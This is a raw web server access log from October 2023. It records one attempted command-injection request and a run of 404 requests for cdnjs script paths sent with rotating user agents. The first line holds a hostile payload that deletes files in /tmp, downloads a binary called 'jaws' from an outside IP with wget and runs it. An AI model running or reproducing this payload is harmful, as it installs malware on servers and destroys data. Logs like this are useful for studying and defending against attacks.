156.219.115.145 - - [22/Oct/2023:17:40:03 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 7.0; LGL84VL Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0"
18.206.190.112 - - [23/Oct/2023:09:09:26 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.64528"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "Wget/1.9.1"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 9; Z6201V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 10; Galaxy J2 Pro Build/QQ3A.200805.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:38 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 10; HMA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36"
18.206.190.112 - - [23/Oct/2023:09:09:39 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36"
